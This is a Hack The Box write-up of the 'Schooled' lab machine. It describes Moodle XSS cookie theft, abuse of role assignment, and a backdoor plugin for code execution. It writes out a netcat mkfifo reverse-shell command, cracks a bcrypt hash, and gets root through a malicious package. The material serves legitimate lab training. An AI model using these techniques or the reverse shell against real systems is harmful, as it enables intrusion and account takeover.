---
layout: single
title: Schooled - Hack The Box
excerpt: "The Schooled HackTheBox machine is a Medium FreeBSD system with a Moodle web content manager, very real-life applicable as many school and university systems are configured the same way as this one. From a simple school webpage, you go through student, teacher and manager accounts to finally root the system."
date: 2021-09-13
classes: wide
header:
  teaser: /assets/images/htb-writeup-schooled/logo_schooled.jpg
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - medium
  - infosec
tags:  
  - FreeBSD
  - moodle
  - PHP
  - hashcat
  - packages
  - mysql
---

![](/assets/images/htb-writeup-schooled/logo_schooled.jpg)

The Schooled HackTheBox machine is a Medium FreeBSD system with a Moodle web content manager, very real-life applicable as many school and university systems are configured the same way as this one. From a simple school webpage, you go through student, teacher and manager accounts to finally root the system.

## Nmap

Ports 22, 80 and 33060 are open.

![](/assets/images/htb-writeup-schooled/schooled1.png)

In the port 22, there is OpenSSH running, and int he 80, a http Apache web server. The 33060 port is about mysql.

![](/assets/images/htb-writeup-schooled/schooled2.png)

## Website

If we connect to the website, we can see a simple school page with some information regarding the school.

![](/assets/images/htb-writeup-schooled/schooled3.png)

If we look carefully, we can know from now that they will be using Moodle.

![](/assets/images/htb-writeup-schooled/schooled4.png)

In the bottom we have a hostname, `schooled.htb`.

![](/assets/images/htb-writeup-schooled/schooled5.png)

Then, we can add this host with `sudo nano /etc/hosts`.

![](/assets/images/htb-writeup-schooled/schooled6.png)

## Fuzzing

We know that the machine may be running Moodle, but to discover this with brute-force, we can use gobuster to fuzz vhosts of the main host. We will be using the `subdomains-top1million-110000.txt` wordlist of `SecLists`, and the parameter `vhost` in `Gobuster`.

![](/assets/images/htb-writeup-schooled/schooled7.png)

The discovered host is `moodle.schooled.htb`, so we add it to our host list again with `sudo nano /etc/hosts` so we can connect to it.

![](/assets/images/htb-writeup-schooled/schooled8.png)

## Moodle enumeration

When we access the Moodle, we can only see four subjects, and a Log in button.

![](/assets/images/htb-writeup-schooled/schooled9.png)

If we click in the log-in button, we will see a register button.

![](/assets/images/htb-writeup-schooled/schooled10.png)

While we are registering we will notice that our email is not valid, but we are provided with the allowed one (`student.schooled.htb`).

![](/assets/images/htb-writeup-schooled/schooled11.png)

Logged in the moodle, is it possible now to enroll to the Mathematics course.

![](/assets/images/htb-writeup-schooled/schooled13.png)

In the announcements pannel of the Maths course, there is a message of the teacher, `Manuel Phillips`. He says he will be checking the profiles of the users that enroll its course.

![](/assets/images/htb-writeup-schooled/schooled14.png)

We now can only search for vulnerabilities in the Moodle, so we first need to know the version that is running. Moodle saves that information in the `/moodle/lib/upgrade.txt` file that we can read. The version is `Moodle 3.9`.

## XSS in moodlenetprofile field

![](/assets/images/htb-writeup-schooled/schooled15.png)

Searching for exploits for that version, and with the information we had, I found that the moodlenetprofile field of the user was vulnerable to XSS.

![](/assets/images/htb-writeup-schooled/schooled16.png)

As the teacher checks your profile when you join his course, we can set a listener in our machine with `python3 -m http.server 4000` or `nc -nvlp 4000`, and write a simple script that retrieves the cookie when executed, and sends it to us.

![](/assets/images/htb-writeup-schooled/schooled17.png)

If we modify the profile, add the script in that field, join the course again, and wait a few minutes, we will receive the Moodle Session of the teacher.

![](/assets/images/htb-writeup-schooled/schooled18.png)

We can now proceed to impersonate his session replacing our cookie with his cookie.

![](/assets/images/htb-writeup-schooled/schooled19.png)

## From teacher to manager

We now have a teacher account, so another Moodle exploit is very useful. With this one, a teacher will be able to assign himself the manager role.

![](/assets/images/htb-writeup-schooled/schooled20.png)

It is possible to enroll users in the Math course.

![](/assets/images/htb-writeup-schooled/schooled21.png)

In the main website, in the about page it says that Lianne Carter is manager.

![](/assets/images/htb-writeup-schooled/schooled22.png)

We will use her to get the manager role, enrolling her to the course, intercepting the request and modifying the parameters.

![](/assets/images/htb-writeup-schooled/schooled23.png)

The original request is the following one.

![](/assets/images/htb-writeup-schooled/schooled24.png)

Here, we can change the id of the user that is being enrolled, from 25 (Lianne) to 24 (Manuel Phillips) anb the role to assign from 4 (student) to (1) manager.

![](/assets/images/htb-writeup-schooled/schooled25.png)

Then, as we are now a manager, we can go to the profile of the real manager, Lianne, and click the "Log in as" button to enter in her account.

![](/assets/images/htb-writeup-schooled/schooled26.png)

We are now Lianne Carter in the Moodle, a user with manager privileges.

![](/assets/images/htb-writeup-schooled/schooled27.png)

## Reverse shell

As a manager, we can modify the manager role to be able to install plugins. In the site administration page, we can click in manage roles, and then in the edit button of manager.

![](/assets/images/htb-writeup-schooled/schooled29.png)

We will start our proxy to intercept the "save changes" request, to modify the payload with burpsuite.

![](/assets/images/htb-writeup-schooled/schooled30.png)

The payload is the original one, modifying all the permissions.

![](/assets/images/htb-writeup-schooled/schooled31.png)

With this done, it is now possible to install plugins in the site administration page.

![](/assets/images/htb-writeup-schooled/schooled32.png)

The structure of the poisoned plugin is the following one. The PHP file will gives us a RCE backdoor. The plugin can be downloaded [here](https://github.com/HoangKien1020/Moodle_RCE).

![](/assets/images/htb-writeup-schooled/schooled33.png)

The validation of the plugin is successful as it keeps the original structure of a real plugin.

![](/assets/images/htb-writeup-schooled/schooled34.png)

To run commands, we can navigate to the `block_rce.php` file, and add as a paremet the command to execute with `?cmd=(command)`.

![](/assets/images/htb-writeup-schooled/schooled35.png)

To obtain a shell in the system, we can handle the request, and insert a URL encoded bash reverse shell command, `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc (Our IP) (Our listening port) >/tmp/f`, and listen in the used port with `nc -nvlp (Port)`.

![](/assets/images/htb-writeup-schooled/schooled36.png)

## Lateral movement

With a shell as the www user, we can read the Moodle configuration file to get the credentials of its database.

![](/assets/images/htb-writeup-schooled/schooled37.png)

The credentials are `moodle:PlaybookMaster2020`, and there is an available `moodle` database.

![](/assets/images/htb-writeup-schooled/schooled39.png)

Using this credentials and enumerating the database, we can dump the usernames and passwords with the SQL query `use moodle; select username, password, email from mdl_user`.

We can see there an admin hash, which email is `jamie@staff.schooled.htb`, so we know that the user may be `jamie`.

![](/assets/images/htb-writeup-schooled/schooled41.png)

The `hashid` tool told us that the hash is most likely a bcrypt Blowfish hash.

![](/assets/images/htb-writeup-schooled/schooled43.png)

We can now crack it with john, specifying the bcrypt format and the rockyou wordlist. It can also be done with hashcat.

![](/assets/images/htb-writeup-schooled/schooled45.png)

The credentials are `jamie:!QAZ2wsx`.

![](/assets/images/htb-writeup-schooled/schooled46.png)

With these credentials, we can connect to the user jamie using SSH, and get a better shell, and a more privileged user in the system.

![](/assets/images/htb-writeup-schooled/schooled47.png)

## Privilege escalation

From here, we can see that the user `jamie` can run as root the command `pkg install`, what means that he can install packages in the system as an administrator.

![](/assets/images/htb-writeup-schooled/schooled48.png)

The faster way to exploit a binary, is to search it in [GTFObins](https://gtfobins.github.io/). There, it says that a malicious file can be created to escatale privileges.

![](/assets/images/htb-writeup-schooled/schooled49.png)

We need to create the package in our machine as we don't have fmp available in the victim, but there is no problem with that, as we can still send it with netcat and install it as elevated user.

![](/assets/images/htb-writeup-schooled/schooled54.png)

When we install the package, we can execute `bash -p` to get the bash, and we will get the root bash as we modified it with our package.

![](/assets/images/htb-writeup-schooled/schooled55.png)

We can now get the root flag, and finish the machine.

![](/assets/images/htb-writeup-schooled/schooled56.png)